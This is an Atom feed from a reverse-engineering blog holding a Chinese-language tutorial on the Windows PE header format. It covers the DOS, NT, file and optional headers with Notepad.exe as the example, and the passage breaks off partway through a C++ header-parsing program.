<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lee&#39;s Blog</title>
  
  <subtitle>专注逆向、网络安全</subtitle>
  <link href="https://vxer-lee.github.io/atom.xml" rel="self"/>
  
  <link href="https://vxer-lee.github.io/"/>
  <updated>2021-11-02T06:02:26.985Z</updated>
  <id>https://vxer-lee.github.io/</id>
  
  <author>
    <name>VxerLee</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PE头详细分析</title>
    <link href="https://vxer-lee.github.io/2021/11/02/PCRe/PE_Header/"/>
    <id>https://vxer-lee.github.io/2021/11/02/PCRe/PE_Header/</id>
    <published>2021-11-02T05:42:08.000Z</published>
    <updated>2021-11-02T06:02:26.985Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近我在学习Linux PWN相关知识的时候，也是在看《程序员的自我修养(装载-&gt;链接-&gt;库)》这本书的时候，接触到了可执行文件格式，COFF、ELF、PE，所以也找了Bilibili上海东老师的《滴水逆向三期》视频中的PE课程在学习，刚看完PE头这节课。在此做个笔记也算是整理学习的结果 并且分享给大家，共同学习，如有错误欢迎指正。</p><h2 id="0x01-PE文件介绍"><a href="#0x01-PE文件介绍" class="headerlink" title="0x01 PE文件介绍"></a>0x01 PE文件介绍</h2><p>PE文件是Windows上的可执行文件，就是我们鼠标双击就能运行的程序，当然也有双击不能运行的程序。其中<code>.exe</code>、<code>.dll</code>、<code>.sys</code>这些都是PE文件，那么读者可能有个疑问，我双击.txt的文件也是能直接打开运行的啊？Emmmmm….这个其实他是用Notepad记事本加载并打开的，而PE可执行文件他是经过系统加载并运行的。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102134311467-524325950.png" alt="image-20211102102833590"> </p><p>PE文件是分块存储的。在图中我们可以看出数据被加载到内存后会不一样，其中PE文件被加载到内存中的时候(相当于一个拉伸的过程)，把数据给拉长了。</p><p>不过块中的数据还是一样的，我们可以看到最开头的快就是PE头的数据，接下来是节表等其他块的数据，这些我们会在后续文章中介绍。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102111812992-1755304041.png" alt="image-20211102111812462"> </p><h2 id="0x02-PE头详细分析"><a href="#0x02-PE头详细分析" class="headerlink" title="0x02 PE头详细分析"></a>0x02 PE头详细分析</h2><p>PE主要由3部分构造，(1)、DOS头   (2)、NT头(标准PE头、可选PE头)。</p><p>参考图：（OpenRCE.org网站上的PE格式图.pdf）</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102112751918-1828613509.png" alt="image-20211102112750039"> </p><h3 id="DOS头解析"><a href="#DOS头解析" class="headerlink" title="DOS头解析"></a>DOS头解析</h3><p>DOS头中的数据如下，其中带*号的是比较重要的数据，DOS头大小为：64字节。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//--&gt; DOS头(_IMAGE_DOS_HEADER ) &lt;--</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">WORD  e_magic;   <span class="comment">//*DOS头魔数 Magic*</span></span><br><span class="line">WORD  e_cblp;    <span class="comment">//[Bytes on last page]</span></span><br><span class="line">WORD  e_cp;      <span class="comment">//[Pages in file]</span></span><br><span class="line">WORD  e_crlc;    <span class="comment">//[Relocations]</span></span><br><span class="line">WORD  e_cparhdr; <span class="comment">//[Size of header]</span></span><br><span class="line">WORD  e_minalloc;<span class="comment">//[Minium memory]</span></span><br><span class="line">WORD  e_maxalloc;<span class="comment">//[Maxium Memory]</span></span><br><span class="line">WORD  e_ss;      <span class="comment">//[Inital SS value]</span></span><br><span class="line">WORD  e_sp;      <span class="comment">//[Inital SP value]</span></span><br><span class="line">WORD  e_csum;    <span class="comment">//[Checksum]</span></span><br><span class="line">WORD  e_ip;      <span class="comment">//[Inital IP value]</span></span><br><span class="line">WORD  e_cs;      <span class="comment">//[Inital CS value]</span></span><br><span class="line">WORD  e_lfarlc;  <span class="comment">//[Table offset]</span></span><br><span class="line">WORD  e_ovno;    <span class="comment">//[Overlay number]</span></span><br><span class="line">WORD  e_res[<span class="number">4</span>];  <span class="comment">//[Reserved words]</span></span><br><span class="line">WORD  e_oemid;   <span class="comment">//[OEM id]</span></span><br><span class="line">WORD  e_oeminfo; <span class="comment">//[OEM infomation]</span></span><br><span class="line">WORD  e_res2[<span class="number">10</span>];<span class="comment">//[Reserved words]</span></span><br><span class="line">DWORD e_lfanew;  <span class="comment">//*NT头地址*</span></span><br><span class="line">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102113317012-964038208.png" alt="image-20211102113315651"> </p><h3 id="NT头解析"><a href="#NT头解析" class="headerlink" title="NT头解析"></a>NT头解析</h3><p>NT头主要由3部分构成，标记、标准PE头、可选PE头。其中NT头魔数就是<code>PE</code>字符串，可见上图。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//--&gt; NT头(_IMAGE_NT_HEADERS) &lt;--</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HREADERS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">DWORD Signature;<span class="comment">//*NT头魔数</span></span><br><span class="line">_IMAGE_FILE_HEADER FileHeader;<span class="comment">//标准PE头</span></span><br><span class="line">_IMAGE_OPTIONAL_HEADER OptionalHeader;<span class="comment">//可选PE头</span></span><br><span class="line">&#125;IMAGE_NT_HREADERS,*PIMAGE_NT_HREADERS;</span><br></pre></td></tr></table></figure><h3 id="标准PE头解析"><a href="#标准PE头解析" class="headerlink" title="标准PE头解析"></a>标准PE头解析</h3><p>标志PE头的固定大小是20字节，其中我们可以看见里面有区段数目的数据。</p><p>还有比较关注的点是时间戳，这个时间戳我们可以用文章<a href="https://www.cnblogs.com/17bdw/p/6412158.html">https://www.cnblogs.com/17bdw/p/6412158.html</a>中的方法转换成<code>文件创建时间</code>。</p><p>最后特征的数据也要关注下，因为可以用他来判断PE文件的许多特征信息，比如是否为DLL文件、重定位信息是否被移去、是否为系统文件等等。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//--&gt; 标准PE头(_IMAGE_FILE_HEADER) &lt;--</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">WORD Machine;<span class="comment">//*运行平台</span></span><br><span class="line">WORD NumberOfSections;<span class="comment">//*区段数目</span></span><br><span class="line">DWORD TimeDateStamp;<span class="comment">//*时间戳</span></span><br><span class="line">DWORD PointerToSymbolTable;<span class="comment">//[Pointer to COFF]</span></span><br><span class="line">DWORD NumberOfSymbols;<span class="comment">//[COFF table size]</span></span><br><span class="line">WORD SizeOfOptionalHeader;<span class="comment">//*可选PE头大小</span></span><br><span class="line">WORD Characteristics;<span class="comment">//*特征</span></span><br><span class="line">&#125;IMAGE_FILE_HEADER,*PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p>HEX数据</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102115557762-801171404.png" alt="image-20211102115557549">  </p><p>解析后</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102114951267-1086229443.png" alt="image-20211102114951403"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102115137613-986329107.png" alt="image-20211102115137714"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102114848714-393649704.png" alt="image-20211102114847003"> </p><h3 id="可选PE头解析"><a href="#可选PE头解析" class="headerlink" title="可选PE头解析"></a>可选PE头解析</h3><h4 id="可选PE头结构"><a href="#可选PE头结构" class="headerlink" title="可选PE头结构"></a>可选PE头结构</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//--&gt; 可选PE头(_IMAGE_OPTIONAL_HEADER) &lt;--</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">WORD Magic;<span class="comment">//[可选PE头魔数]</span></span><br><span class="line">BYTE MajorLinkerVersion;<span class="comment">//[主链接器版本]</span></span><br><span class="line">BYTE MinorLinkerVersion;<span class="comment">//[副链接器版本]</span></span><br><span class="line">DWORD SizeOfCode;<span class="comment">//[代码段大小]</span></span><br><span class="line">DWORD SizeOfInitializedData;<span class="comment">//[初始化数据大小]</span></span><br><span class="line">DWORD SizeOfUninitializedData;<span class="comment">//[未初始化数据大小]</span></span><br><span class="line">DWORD AddressOfEntryPoint;<span class="comment">//*[程序入口点]</span></span><br><span class="line">DWORD BaseOfCode;<span class="comment">//*[代码段地址]</span></span><br><span class="line">DWORD BaseOfData;<span class="comment">//*[数据段地址]</span></span><br><span class="line">DWORD ImageBase;<span class="comment">// *[加载到内存的开始地址] -&gt; 一般好像都是0x400000</span></span><br><span class="line">DWORD SectionAlignment;<span class="comment">//*[内存页对其大小]</span></span><br><span class="line">DWORD FileAlignment;<span class="comment">//[文件对其大小]</span></span><br><span class="line">WORD MajorOperatingSystemVersion;<span class="comment">//*[操作系统的主版本号]</span></span><br><span class="line">WORD MinjorOperatingSystemVersion;<span class="comment">//*[操作系统的次版本号]</span></span><br><span class="line">WORD MajorImageVersion;<span class="comment">//[程序主版本号]</span></span><br><span class="line">WORD MinorImageVersion;<span class="comment">//[程序次版本号]</span></span><br><span class="line">WORD MajorSubsystemVersion;<span class="comment">//[子系统主版本号]</span></span><br><span class="line">WORD MinorSubsystemVersion;<span class="comment">//[子系统次版本号]</span></span><br><span class="line">DWORD Win32VersionValue;<span class="comment">//[默认保留]</span></span><br><span class="line">DWORD SizeOfImage;<span class="comment">//*[加载到内存映像的大小]</span></span><br><span class="line">DWORD SizeOfHeaders;<span class="comment">//[DOS头 PE头 节头组合大小]</span></span><br><span class="line">DWORD CheckSum;<span class="comment">//*[获取加载到内存映像的hash]</span></span><br><span class="line">WORD Subsystem;<span class="comment">//[运行此映像所需要的子系统名称]</span></span><br><span class="line">WORD DllCharacteristics;<span class="comment">//[DLL映像的特征]</span></span><br><span class="line">DWORD SizeOfStackReserve;<span class="comment">//*[获取保留堆栈的大小]</span></span><br><span class="line">DWORD SizeOfStackCommit;<span class="comment">//*[获取要提交堆栈的大小]</span></span><br><span class="line">DWORD SizeOfHeapReserve;<span class="comment">//*[获取保留堆空间的大小]</span></span><br><span class="line">DWORD SizeOfHeapCommit;<span class="comment">//*[获取要提交的本地堆空间大小]</span></span><br><span class="line">DWORD LoaderFlags;<span class="comment">//[之前保留的成员]</span></span><br><span class="line">DWORD NumberOfRvaAndSizes;<span class="comment">//*[获取 PEHeader 剩余部分中数据目录项的数目 |位置和大小]</span></span><br><span class="line">_IMAGE_DATA_DIRECTORY DataDirectory[<span class="number">16</span>];<span class="comment">//[指向数据目录中的第一个 IMAGE_DATA_DIRECTORY 结构的指针。]</span></span><br><span class="line">&#125;IMAGE_OPTIONAL_HEADER,*PIMAGE_OPTIONAL_HEADER;</span><br></pre></td></tr></table></figure><p>可以看出可选PE头数据最多，不过这是好事对我们有用的数据也很多，比如下面标红的都是平时在逆向或者脱壳、破解中比较有用的信息。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102120641474-1437948439.png" alt="image-20211102120641106"> </p><h4 id="基址"><a href="#基址" class="headerlink" title="基址"></a>基址</h4><p>首先第一个魔数0x010B我们就不说了，主要应该是为了区别32位和64位程序吧。</p><p>接着我们看程序基地址<code>0x01000000</code>，这个基地址的意思就是程序加载到内存时候PE文件所在的位置，Windows他会为每个程序分配一个虚拟的4GB空间。</p><p>这里有的读者会问那为什么基址非要那么大，为什么不是0呢？因为Windows他有一段内存是用来保护用的，平时我们在写C++代码时候比如：我们引用了一个NULL(空指针)其指向的内存地址就是0的时候，程序就会崩溃就会报错！，没错这就是Windows为了保护程序设计的。</p><p>我们也可以用Winhex打开加载在内存中Notepad.exe的数据，可以发现其首地址就是程序基址。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102121506776-481846426.png" alt="image-20211102121506217"> </p><h4 id="代码段地址"><a href="#代码段地址" class="headerlink" title="代码段地址"></a>代码段地址</h4><p>接着我们来看代码段的地址<code>0x001000</code>,也就是PE文件在这地方开始存的都是程序代码，当然在底层被转为了汇编代码。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102122001134-890847316.png" alt="image-20211102122000641"> </p><p>我们可以用radare2套件中的rasm2来将十六进制转换成汇编代码看看。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rasm2 -a x86 -b 32 -d <span class="string">&quot;十六进制&quot;</span></span><br><span class="line"><span class="comment">#-a 代表平台 x86架构平台</span></span><br><span class="line"><span class="comment">#-b 位数     32位</span></span><br><span class="line"><span class="comment">#-d 解码     解析成汇编</span></span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102122325331-1879980582.png" alt="image-20211102122324910"> </p><h4 id="数据段地址"><a href="#数据段地址" class="headerlink" title="数据段地址"></a>数据段地址</h4><p>接下来看数据段的地址<code>0x009000</code>,数据段主要存放数据，比如字符串等数据，在下图中能看到存放了Notepad字符串。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102132150320-732576871.png" alt="image-20211102132149727"> </p><h4 id="OEP程序入口点"><a href="#OEP程序入口点" class="headerlink" title="OEP程序入口点"></a>OEP程序入口点</h4><p>OEP是可选PE头结构体中第7个成员<code>AddressOfEntryPoint</code>的数据，顾名思义指的是程序开始执行的第一行代码位置。</p><p>由于程序被加载到内存，所以我们还需要加上<code>基址</code>才是真实的程序入口点。 </p><p>即：<code>基址</code>+<code>OEP</code> = 0x01000000 + 0x739D = <code>0x0100739D</code>。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102132902548-1879212488.png" alt="image-20211102132902638"> </p><p>我们可以用工具将其转换成汇编，看看第一行汇编代码是什么？</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102133015312-1448242242.png" alt="image-20211102133015445"> </p><p>我们也可以利用OD来加载程序，OD加载程序默认会自动加载到OEP处。所以可以来验证下我们找的位置对不对。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102133152335-107481609.png" alt="image-20211102133152033"> </p><p>好了可选头PE内容介绍到这里就结束了，其中可选PE头还有最有一个结构体数据<code>_IMAGE_DATA_DIRECTORY</code>，这个暂时就先不介绍了，留在后面介绍其他内容的时候在详解。</p><h2 id="0x03-PE头解析工具编写"><a href="#0x03-PE头解析工具编写" class="headerlink" title="0x03 PE头解析工具编写"></a>0x03 PE头解析工具编写</h2><p>知道了PE头结构后，代码写起来也是很方便，而且微软有自带的PE头结构体，我们可以直接open()文件后直接读取内容到结构体解析即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*******************************************************</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* 学习滴水逆向 PE结构分析代码练习</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* 海东老师 Bilibili：滴水逆向三期</span></span><br><span class="line"><span class="comment">*********************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//头文件定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//--------------------------PE结构----------------------------------</span></span><br><span class="line"><span class="comment">//--&gt; DOS头(_IMAGE_DOS_HEADER ) &lt;--</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER_2</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">WORD  e_magic;   <span class="comment">//*DOS头魔数 Magic*</span></span><br><span class="line">WORD  e_cblp;    <span class="comment">//[Bytes on last page]</span></span><br><span class="line">WORD  e_cp;      <span class="comment">//[Pages in file]</span></span><br><span class="line">WORD  e_crlc;    <span class="comment">//[Relocations]</span></span><br><span class="line">WORD  e_cparhdr; <span class="comment">//[Size of header]</span></span><br><span class="line">WORD  e_minalloc;<span class="comment">//[Minium memory]</span></span><br><span class="line">WORD  e_maxalloc;<span class="comment">//[Maxium Memory]</span></span><br><span class="line">WORD  e_ss;      <span class="comment">//[Inital SS value]</span></span><br><span class="line">WORD  e_sp;      <span class="comment">//[Inital SP value]</span></span><br><span class="line">WORD  e_csum;    <span class="comment">//[Checksum]</span></span><br><span class="line">WORD  e_ip;      <span class="comment">//[Inital IP value]</span></span><br><span class="line">WORD  e_cs;      <span class="comment">//[Inital CS value]</span></span><br><span class="line">WORD  e_lfarlc;  <span class="comment">//[Table offset]</span></span><br><span class="line">WORD  e_ovno;    <span class="comment">//[Overlay number]</span></span><br><span class="line">WORD  e_res[<span class="number">4</span>];  <span class="comment">//[Reserved words]</span></span><br><span class="line">WORD  e_oemid;   <span class="comment">//[OEM id]</span></span><br><span class="line">WORD  e_oeminfo; <span class="comment">//[OEM infomation]</span></span><br><span class="line">WORD  e_res2[<span class="number">10</span>];<span class="comment">//[Reserved words]</span></span><br><span class="line">DWORD e_lfanew;  <span class="comment">//*PE文件头地址*</span></span><br><span class="line">&#125; IMAGE_DOS_HEADER_2, *PIMAGE_DOS_HEADER_2;</span><br><span class="line"><span class="comment">//--&gt; NT头(_IMAGE_NT_HEADERS) &lt;--</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HREADERS_2</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">DWORD Signature;</span><br><span class="line">_IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">_IMAGE_OPTIONAL_HEADER OptionalHeader;</span><br><span class="line">&#125;IMAGE_NT_HREADERS_2,*PIMAGE_NT_HREADERS_2;</span><br><span class="line"><span class="comment">//--&gt; 标准PE头(_IMAGE_FILE_HEADER) &lt;--</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER_2</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">WORD Machine;</span><br><span class="line">WORD NumberOfSections;</span><br><span class="line">DWORD TimeDateStamp;</span><br><span class="line">DWORD PointerToSymbolTable;</span><br><span class="line">DWORD NumberOfSymbols;</span><br><span class="line">WORD SizeOfOptionalHeader;</span><br><span class="line">WORD Characteristics;</span><br><span class="line">&#125;IMAGE_FILE_HEADER_2,*PIMAGE_FILE_HEADER_2;</span><br><span class="line"><span class="comment">//--&gt; 可选PE头(_IMAGE_OPTIONAL_HEADER) &lt;--</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER_2</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">WORD Magic;<span class="comment">//[可选PE头魔数]</span></span><br><span class="line">BYTE MajorLinkerVersion;<span class="comment">//[主链接器版本]</span></span><br><span class="line">BYTE MinorLinkerVersion;<span class="comment">//[副链接器版本]</span></span><br><span class="line">DWORD SizeOfCode;<span class="comment">//[代码段大小]</span></span><br><span class="line">DWORD SizeOfInitializedData;<span class="comment">//[初始化数据大小]</span></span><br><span class="line">DWORD SizeOfUninitializedData;<span class="comment">//[未初始化数据大小]</span></span><br><span class="line">DWORD AddressOfEntryPoint;<span class="comment">//*[程序入口点]</span></span><br><span class="line">DWORD BaseOfCode;<span class="comment">//*[代码段地址]</span></span><br><span class="line">DWORD BaseOfData;<span class="comment">//*[数据段地址]</span></span><br><span class="line">DWORD ImageBase;<span class="comment">// *[加载到内存的开始地址] -&gt; 一般好像都是0x400000</span></span><br><span class="line">DWORD SectionAlignment;<span class="comment">//*[内存页对其大小]</span></span><br><span class="line">DWORD FileAlignment;<span class="comment">//[文件对其大小]</span></span><br><span class="line">WORD MajorOperatingSystemVersion;<span class="comment">//*[操作系统的主版本号]</span></span><br><span class="line">WORD MinjorOperatingSystemVersion;<span class="comment">//*[操作系统的次版本号]</span></span><br><span class="line">WORD MajorImageVersion;<span class="comment">//[程序主版本号]</span></span><br><span class="line">WORD MinorImageVersion;<span class="comment">//[程序次版本号]</span></span><br><span class="line">WORD MajorSubsystemVersion;<span class="comment">//[子系统主版本号]</span></span><br><span class="line">WORD MinorSubsystemVersion;<span class="comment">//[子系统次版本号]</span></span><br><span class="line">DWORD Win32VersionValue;<span class="comment">//[默认保留]</span></span><br><span class="line">DWORD SizeOfImage;<span class="comment">//*[加载到内存映像的大小]</span></span><br><span class="line">DWORD SizeOfHeaders;<span class="comment">//[DOS头 PE头 节头组合大小]</span></span><br><span class="line">DWORD CheckSum;<span class="comment">//*[获取加载到内存映像的hash]</span></span><br><span class="line">WORD Subsystem;<span class="comment">//[运行此映像所需要的子系统名称]</span></span><br><span class="line">WORD DllCharacteristics;<span class="comment">//[DLL映像的特征]</span></span><br><span class="line">DWORD SizeOfStackReserve;<span class="comment">//*[获取保留堆栈的大小]</span></span><br><span class="line">DWORD SizeOfStackCommit;<span class="comment">//*[获取要提交堆栈的大小]</span></span><br><span class="line">DWORD SizeOfHeapReserve;<span class="comment">//*[获取保留堆空间的大小]</span></span><br><span class="line">DWORD SizeOfHeapCommit;<span class="comment">//*[获取要提交的本地堆空间大小]</span></span><br><span class="line">DWORD LoaderFlags;<span class="comment">//[之前保留的成员]</span></span><br><span class="line">DWORD NumberOfRvaAndSizes;<span class="comment">//*[获取 PEHeader 剩余部分中数据目录项的数目 |位置和大小]</span></span><br><span class="line">_IMAGE_DATA_DIRECTORY DataDirectory[<span class="number">16</span>];<span class="comment">//[指向数据目录中的第一个 